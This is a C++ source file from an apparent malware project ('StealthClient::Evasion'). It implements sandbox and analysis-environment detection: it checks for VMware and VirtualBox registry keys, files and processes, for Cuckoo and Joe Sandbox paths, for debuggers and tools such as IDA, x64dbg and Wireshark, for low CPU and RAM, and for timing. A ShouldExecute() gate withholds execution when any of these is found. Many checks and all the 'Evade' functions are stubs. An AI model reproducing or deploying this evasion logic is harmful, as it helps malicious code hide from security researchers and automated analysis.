#include "sandbox_detection.h"
#include "dynamic_api.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <thread>
#include <random>
#include <tlhelp32.h>

namespace StealthClient {
namespace Evasion {

// Global instance
SandboxDetection g_SandboxDetection;

SandboxDetection::SandboxDetection() 
    : m_detectionThreshold(5)
    , m_advancedDetection(true)
    , m_evasionMode(false)
{
    m_detectionResults.clear();
}

SandboxDetection::~SandboxDetection() {
    m_detectionResults.clear();
}

bool SandboxDetection::IsVirtualMachine() {
    std::cout << "[DEBUG] Checking for virtual machine..." << std::endl;
    
    int vmScore = 0;
    
    // Check for VMware
    if (DetectVMware()) {
        vmScore += 3;
        m_detectionResults.push_back("VMware detected");
    }
    
    // Check for VirtualBox
    if (DetectVirtualBox()) {
        vmScore += 3;
        m_detectionResults.push_back("VirtualBox detected");
    }
    
    // Check for QEMU
    if (DetectQEMU()) {
        vmScore += 3;
        m_detectionResults.push_back("QEMU detected");
    }
    
    // Check for Hyper-V
    if (DetectHyperV()) {
        vmScore += 2;
        m_detectionResults.push_back("Hyper-V detected");
    }
    
    // Check hardware characteristics
    if (CheckCPUCores() || CheckRAMSize() || CheckDiskSize()) {
        vmScore += 2;
        m_detectionResults.push_back("Suspicious hardware configuration");
    }
    
    // Check timing
    if (CheckTimingAttack()) {
        vmScore += 2;
        m_detectionResults.push_back("Timing attack detected");
    }
    
    bool isVM = vmScore >= m_detectionThreshold;
    std::cout << "[DEBUG] VM Detection Score: " << vmScore << " (Threshold: " << m_detectionThreshold << ")" << std::endl;
    
    return isVM;
}

bool SandboxDetection::IsSandbox() {
    std::cout << "[DEBUG] Checking for sandbox environment..." << std::endl;
    
    int sandboxScore = 0;
    
    // Check for known sandbox processes
    if (CheckSandboxProcesses()) {
        sandboxScore += 4;
        m_detectionResults.push_back("Sandbox processes detected");
    }
    
    // Check for analysis tools
    if (CheckAnalysisTools()) {
        sandboxScore += 3;
        m_detectionResults.push_back("Analysis tools detected");
    }
    
    // Check for debugger processes
    if (CheckDebuggerProcesses()) {
        sandboxScore += 2;
        m_detectionResults.push_back("Debugger processes detected");
    }
    
    // Check for monitoring tools
    if (CheckMonitoringTools()) {
        sandboxScore += 2;
        m_detectionResults.push_back("Monitoring tools detected");
    }
    
    // Check sandbox files
    if (CheckSandboxFiles()) {
        sandboxScore += 3;
        m_detectionResults.push_back("Sandbox files detected");
    }
    
    // Check registry artifacts
    if (CheckSandboxRegistry()) {
        sandboxScore += 2;
        m_detectionResults.push_back("Sandbox registry artifacts detected");
    }
    
    // Check user profiles
    if (CheckUserProfiles()) {
        sandboxScore += 1;
        m_detectionResults.push_back("Suspicious user profile configuration");
    }
    
    bool isSandbox = sandboxScore >= m_detectionThreshold;
    std::cout << "[DEBUG] Sandbox Detection Score: " << sandboxScore << " (Threshold: " << m_detectionThreshold << ")" << std::endl;
    
    return isSandbox;
}

bool SandboxDetection::IsAnalysisEnvironment() {
    std::cout << "[DEBUG] Checking for analysis environment..." << std::endl;
    
    int analysisScore = 0;
    
    // Check for debugger
    if (DetectDebugger()) {
        analysisScore += 3;
        m_detectionResults.push_back("Debugger detected");
    }
    
    // Check for emulator
    if (DetectEmulator()) {
        analysisScore += 2;
        m_detectionResults.push_back("Emulator detected");
    }
    
    // Check for research environment
    if (DetectResearchEnvironment()) {
        analysisScore += 2;
        m_detectionResults.push_back("Research environment detected");
    }
    
    // Check for honeypot
    if (DetectHoneypot()) {
        analysisScore += 4;
        m_detectionResults.push_back("Honeypot detected");
    }
    
    bool isAnalysis = analysisScore >= m_detectionThreshold;
    std::cout << "[DEBUG] Analysis Environment Score: " << analysisScore << " (Threshold: " << m_detectionThreshold << ")" << std::endl;
    
    return isAnalysis;
}

bool SandboxDetection::ShouldExecute() {
    std::cout << "[DEBUG] Determining if execution should proceed..." << std::endl;
    
    bool isVM = IsVirtualMachine();
    bool isSandbox = IsSandbox();
    bool isAnalysis = IsAnalysisEnvironment();
    
    bool shouldExecute = !(isVM || isSandbox || isAnalysis);
    
    if (!shouldExecute) {
        std::cout << "[WARNING] Execution blocked due to detection:" << std::endl;
        for (const auto& result : m_detectionResults) {
            std::cout << "  - " << result << std::endl;
        }
    } else {
        std::cout << "[DEBUG] Environment appears safe for execution" << std::endl;
    }
    
    return shouldExecute;
}

bool SandboxDetection::DetectVMware() {
    // Check VMware registry keys
    if (CheckVMwareRegistry()) return true;
    
    // Check VMware files
    if (CheckVMwareFiles()) return true;
    
    // Check VMware processes
    if (CheckVMwareProcesses()) return true;
    
    // Check VMware artifacts
    if (CheckVMwareArtifacts()) return true;
    
    return false;
}

bool SandboxDetection::DetectVirtualBox() {
    // Check VirtualBox registry keys
    if (CheckVirtualBoxRegistry()) return true;
    
    // Check VirtualBox files
    if (CheckVirtualBoxFiles()) return true;
    
    // Check VirtualBox processes
    if (CheckVirtualBoxProcesses()) return true;
    
    // Check VirtualBox artifacts
    if (CheckVirtualBoxArtifacts()) return true;
    
    return false;
}

bool SandboxDetection::DetectQEMU() {
    return CheckQEMUArtifacts();
}

bool SandboxDetection::DetectHyperV() {
    return CheckHyperVArtifacts();
}

bool SandboxDetection::DetectCuckooSandbox() {
    // Check for Cuckoo sandbox indicators
    std::vector<std::string> cuckooFiles = {
        "C:\\cuckoo",
        "C:\\cuckoo\\logs",
        "C:\\cuckoo\\storage",
        "C:\\cuckoo\\agent"
    };
    
    for (const auto& file : cuckooFiles) {
        if (FileExists(file)) {
            m_detectionResults.push_back("Cuckoo sandbox file: " + file);
            return true;
        }
    }
    
    // Check for Cuckoo processes
    if (ProcessExists("cuckoo.exe") || ProcessExists("cuckoo-agent.exe")) {
        m_detectionResults.push_back("Cuckoo sandbox process detected");
        return true;
    }
    
    return false;
}

bool SandboxDetection::DetectJoeSandbox() {
    // Check for Joe Sandbox indicators
    if (ProcessExists("joesandbox.exe") || ProcessExists("joesandbox-agent.exe")) {
        m_detectionResults.push_back("Joe Sandbox process detected");
        return true;
    }
    
    return false;
}

bool SandboxDetection::DetectDebugger() {
    // Check for debugger using IsDebuggerPresent
    if (IsDebuggerPresent()) {
        m_detectionResults.push_back("Debugger present (IsDebuggerPresent)");
        return true;
    }
    
    // Check for remote debugger
    BOOL isRemoteDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebuggerPresent);
    if (isRemoteDebuggerPresent) {
        m_detectionResults.push_back("Remote debugger present");
        return true;
    }
    
    // Check for debugger processes
    if (CheckDebuggerProcesses()) {
        return true;
    }
    
    return false;
}

bool SandboxDetection::CheckVMwareRegistry() {
    std::vector<std::string> vmwareKeys = {
        "SOFTWARE\\VMware, Inc.\\VMware Tools",
        "SOFTWARE\\VMware, Inc.\\VMware Workstation",
        "SOFTWARE\\VMware, Inc.\\VMware Player",
        "SYSTEM\\CurrentControlSet\\Services\\VMTools",
        "SYSTEM\\CurrentControlSet\\Services\\VMMEMCTL",
        "SYSTEM\\CurrentControlSet\\Services\\VMMOUSE"
    };
    
    for (const auto& key : vmwareKeys) {
        std::string value = GetRegistryValue(HKEY_LOCAL_MACHINE, key, "");
        if (!value.empty()) {
            m_detectionResults.push_back("VMware registry key: " + key);
            return true;
        }
    }
    
    return false;
}

bool SandboxDetection::CheckVirtualBoxRegistry() {
    std::vector<std::string> vboxKeys = {
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        "SYSTEM\\CurrentControlSet\\Services\\VBoxService",
        "SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
        "SYSTEM\\CurrentControlSet\\Services\\VBoxMouse"
    };
    
    for (const auto& key : vboxKeys) {
        std::string value = GetRegistryValue(HKEY_LOCAL_MACHINE, key, "");
        if (!value.empty()) {
            m_detectionResults.push_back("VirtualBox registry key: " + key);
            return true;
        }
    }
    
    return false;
}

bool SandboxDetection::CheckVMwareFiles() {
    std::vector<std::string> vmwareFiles = {
        "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe",
        "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd64.exe",
        "C:\\Windows\\System32\\vmtoolsd.exe",
        "C:\\Windows\\System32\\vmtoolsd64.exe"
    };
    
    for (const auto& file : vmwareFiles) {
        if (FileExists(file)) {
            m_detectionResults.push_back("VMware file: " + file);
            return true;
        }
    }
    
    return false;
}

bool SandboxDetection::CheckVirtualBoxFiles() {
    std::vector<std::string> vboxFiles = {
        "C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\VBoxService.exe",
        "C:\\Windows\\System32\\VBoxService.exe",
        "C:\\Windows\\System32\\VBoxSF.sys"
    };
    
    for (const auto& file : vboxFiles) {
        if (FileExists(file)) {
            m_detectionResults.push_back("VirtualBox file: " + file);
            return true;
        }
    }
    
    return false;
}

bool SandboxDetection::CheckVMwareProcesses() {
    std::vector<std::string> vmwareProcesses = {
        "vmtoolsd.exe",
        "vmtoolsd64.exe",
        "vmwaretray.exe",
        "vmwareuser.exe",
        "vmacthlp.exe"
    };
    
    for (const auto& process : vmwareProcesses) {
        if (ProcessExists(process)) {
            m_detectionResults.push_back("VMware process: " + process);
            return true;
        }
    }
    
    return false;
}

bool SandboxDetection::CheckVirtualBoxProcesses() {
    std::vector<std::string> vboxProcesses = {
        "VBoxService.exe",
        "VBoxTray.exe",
        "VBoxControl.exe"
    };
    
    for (const auto& process : vboxProcesses) {
        if (ProcessExists(process)) {
            m_detectionResults.push_back("VirtualBox process: " + process);
            return true;
        }
    }
    
    return false;
}

bool SandboxDetection::CheckCPUCores() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    
    // VMs often have limited CPU cores
    if (sysInfo.dwNumberOfProcessors < 2) {
        m_detectionResults.push_back("Low CPU core count: " + std::to_string(sysInfo.dwNumberOfProcessors));
        return true;
    }
    
    return false;
}

bool SandboxDetection::CheckRAMSize() {
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    
    // VMs often have limited RAM
    DWORDLONG totalRAM = memStatus.ullTotalPhys / (1024 * 1024 * 1024); // GB
    if (totalRAM < 2) {
        m_detectionResults.push_back("Low RAM: " + std::to_string(totalRAM) + " GB");
        return true;
    }
    
    return false;
}

bool SandboxDetection::CheckTimingAttack() {
    // Measure time for a simple operation
    auto start = std::chrono::high_resolution_clock::now();
    
    // Perform some CPU-intensive operation
    volatile int sum = 0;
    for (int i = 0; i < 1000000; i++) {
        sum += i;
    }
    
    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
    
    // If operation takes too long, might be in a VM
    if (duration.count() > 100) {
        m_detectionResults.push_back("Timing attack detected: " + std::to_string(duration.count()) + "ms");
        return true;
    }
    
    return false;
}

bool SandboxDetection::CheckSandboxProcesses() {
    std::vector<std::string> sandboxProcesses = {
        "cuckoo.exe",
        "joesandbox.exe",
        "threatgrid.exe",
        "fireeye.exe",
        "sandboxie.exe",
        "wireshark.exe",
        "fiddler.exe",
        "procmon.exe",
        "regmon.exe",
        "filemon.exe"
    };
    
    for (const auto& process : sandboxProcesses) {
        if (ProcessExists(process)) {
            m_detectionResults.push_back("Sandbox process: " + process);
            return true;
        }
    }
    
    return false;
}

bool SandboxDetection::CheckAnalysisTools() {
    std::vector<std::string> analysisTools = {
        "ida.exe",
        "ida64.exe",
        "x64dbg.exe",
        "x32dbg.exe",
        "ollydbg.exe",
        "windbg.exe",
        "immunity.exe",
        "ghidra.exe",
        "radare2.exe",
        "gdb.exe"
    };
    
    for (const auto& tool : analysisTools) {
        if (ProcessExists(tool)) {
            m_detectionResults.push_back("Analysis tool: " + tool);
            return true;
        }
    }
    
    return false;
}

bool SandboxDetection::CheckDebuggerProcesses() {
    std::vector<std::string> debuggerProcesses = {
        "ollydbg.exe",
        "windbg.exe",
        "x64dbg.exe",
        "x32dbg.exe",
        "immunity.exe",
        "ida.exe",
        "ida64.exe"
    };
    
    for (const auto& process : debuggerProcesses) {
        if (ProcessExists(process)) {
            m_detectionResults.push_back("Debugger process: " + process);
            return true;
        }
    }
    
    return false;
}

bool SandboxDetection::CheckMonitoringTools() {
    std::vector<std::string> monitoringTools = {
        "procmon.exe",
        "regmon.exe",
        "filemon.exe",
        "wireshark.exe",
        "fiddler.exe",
        "tcpview.exe",
        "processhacker.exe"
    };
    
    for (const auto& tool : monitoringTools) {
        if (ProcessExists(tool)) {
            m_detectionResults.push_back("Monitoring tool: " + tool);
            return true;
        }
    }
    
    return false;
}

bool SandboxDetection::CheckSandboxFiles() {
    std::vector<std::string> sandboxFiles = {
        "C:\\cuckoo",
        "C:\\sandbox",
        "C:\\malware",
        "C:\\analysis",
        "C:\\temp\\sandbox"
    };
    
    for (const auto& file : sandboxFiles) {
        if (FileExists(file)) {
            m_detectionResults.push_back("Sandbox file: " + file);
            return true;
        }
    }
    
    return false;
}

bool SandboxDetection::CheckUserProfiles() {
    // Check for suspicious user profile names
    std::vector<std::string> suspiciousUsers = {
        "sandbox",
        "malware",
        "analysis",
        "cuckoo",
        "vmware",
        "vbox"
    };
    
    char username[256];
    DWORD size = sizeof(username);
    if (GetUserNameA(username, &size)) {
        std::string userStr(username);
        std::transform(userStr.begin(), userStr.end(), userStr.begin(), ::tolower);
        
        for (const auto& suspicious : suspiciousUsers) {
            if (userStr.find(suspicious) != std::string::npos) {
                m_detectionResults.push_back("Suspicious username: " + userStr);
                return true;
            }
        }
    }
    
    return false;
}

bool SandboxDetection::CheckSandboxRegistry() {
    // Check for sandbox-related registry entries
    std::vector<std::string> sandboxKeys = {
        "SOFTWARE\\Cuckoo",
        "SOFTWARE\\Joe Sandbox",
        "SOFTWARE\\ThreatGrid",
        "SOFTWARE\\FireEye"
    };
    
    for (const auto& key : sandboxKeys) {
        std::string value = GetRegistryValue(HKEY_LOCAL_MACHINE, key, "");
        if (!value.empty()) {
            m_detectionResults.push_back("Sandbox registry key: " + key);
            return true;
        }
    }
    
    return false;
}

// Helper functions
std::string SandboxDetection::GetRegistryValue(HKEY hKey, const std::string& subKey, const std::string& valueName) {
    HKEY hSubKey;
    if (RegOpenKeyExA(hKey, subKey.c_str(), 0, KEY_READ, &hSubKey) != ERROR_SUCCESS) {
        return "";
    }
    
    char buffer[256];
    DWORD bufferSize = sizeof(buffer);
    DWORD type;
    
    LONG result = RegQueryValueExA(hSubKey, valueName.c_str(), NULL, &type, 
                                  reinterpret_cast<LPBYTE>(buffer), &bufferSize);
    
    RegCloseKey(hSubKey);
    
    if (result == ERROR_SUCCESS && type == REG_SZ) {
        return std::string(buffer);
    }
    
    return "";
}

bool SandboxDetection::FileExists(const std::string& path) {
    DWORD attributes = GetFileAttributesA(path.c_str());
    return (attributes != INVALID_FILE_ATTRIBUTES && 
            !(attributes & FILE_ATTRIBUTE_DIRECTORY));
}

bool SandboxDetection::ProcessExists(const std::string& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName.c_str()) == 0) {
                CloseHandle(hSnapshot);
                return true;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return false;
}

// Stub implementations for remaining functions
bool SandboxDetection::CheckVMwareArtifacts() { return false; }
bool SandboxDetection::CheckVirtualBoxArtifacts() { return false; }
bool SandboxDetection::CheckQEMUArtifacts() { return false; }
bool SandboxDetection::CheckHyperVArtifacts() { return false; }
bool SandboxDetection::CheckDiskSize() { return false; }
bool SandboxDetection::CheckHardwareInfo() { return false; }
bool SandboxDetection::CheckCPUBrand() { return false; }
bool SandboxDetection::CheckMotherboardInfo() { return false; }
bool SandboxDetection::CheckSleepAcceleration() { return false; }
bool SandboxDetection::CheckPerformanceCounters() { return false; }
bool SandboxDetection::CheckRecentFiles() { return false; }
bool SandboxDetection::CheckDesktopFiles() { return false; }
bool SandboxDetection::CheckInstalledSoftware() { return false; }
bool SandboxDetection::CheckSystemInfo() { return false; }
bool SandboxDetection::CheckNetworkAdapters() { return false; }
bool SandboxDetection::CheckDNSConfiguration() { return false; }
bool SandboxDetection::CheckProxySettings() { return false; }
bool SandboxDetection::CheckMemoryLayout() { return false; }
bool SandboxDetection::CheckLoadedModules() { return false; }
bool SandboxDetection::CheckSystemDLLs() { return false; }

// Additional stub implementations
bool SandboxDetection::DetectVMwareWorkstation() { return false; }
bool SandboxDetection::DetectVMwarePlayer() { return false; }
bool SandboxDetection::DetectVirtualPC() { return false; }
bool SandboxDetection::DetectParallels() { return false; }
bool SandboxDetection::DetectXen() { return false; }
bool SandboxDetection::DetectKVM() { return false; }
bool SandboxDetection::DetectThreatGrid() { return false; }
bool SandboxDetection::DetectFireEye() { return false; }
bool SandboxDetection::DetectCrowdStrike() { return false; }
bool SandboxDetection::DetectSentinelOne() { return false; }
bool SandboxDetection::DetectCylance() { return false; }
bool SandboxDetection::DetectWindowsDefender() { return false; }
bool SandboxDetection::DetectKaspersky() { return false; }
bool SandboxDetection::DetectNorton() { return false; }
bool SandboxDetection::DetectMcAfee() { return false; }
bool SandboxDetection::DetectBitdefender() { return false; }
bool SandboxDetection::DetectESET() { return false; }
bool SandboxDetection::DetectAvast() { return false; }
bool SandboxDetection::DetectAVG() { return false; }
bool SandboxDetection::DetectEmulator() { return false; }
bool SandboxDetection::DetectHoneypot() { return false; }
bool SandboxDetection::DetectResearchEnvironment() { return false; }

// Evasion techniques
bool SandboxDetection::EvadeTimingDetection() { return true; }
bool SandboxDetection::EvadeProcessDetection() { return true; }
bool SandboxDetection::EvadeFileDetection() { return true; }
bool SandboxDetection::EvadeRegistryDetection() { return true; }
bool SandboxDetection::EvadeNetworkDetection() { return true; }
bool SandboxDetection::EvadeMemoryDetection() { return true; }

// Get detection results
std::vector<std::string> SandboxDetection::GetDetectionResults() {
    return m_detectionResults;
}

std::string SandboxDetection::GetDetectionSummary() {
    std::stringstream ss;
    ss << "Detection Results (" << m_detectionResults.size() << " findings):\n";
    for (const auto& result : m_detectionResults) {
        ss << "  - " << result << "\n";
    }
    return ss.str();
}

int SandboxDetection::GetDetectionScore() {
    return static_cast<int>(m_detectionResults.size());
}

// Configuration
void SandboxDetection::SetDetectionThreshold(int threshold) {
    m_detectionThreshold = threshold;
}

void SandboxDetection::EnableAdvancedDetection(bool enable) {
    m_advancedDetection = enable;
}

void SandboxDetection::SetEvasionMode(bool enable) {
    m_evasionMode = enable;
}

// Convenience functions
bool IsVirtualMachine() {
    return g_SandboxDetection.IsVirtualMachine();
}

bool IsSandbox() {
    return g_SandboxDetection.IsSandbox();
}

bool IsAnalysisEnvironment() {
    return g_SandboxDetection.IsAnalysisEnvironment();
}

bool ShouldExecute() {
    return g_SandboxDetection.ShouldExecute();
}

std::string GetDetectionSummary() {
    return g_SandboxDetection.GetDetectionSummary();
}

} // namespace Evasion
} // namespace StealthClient
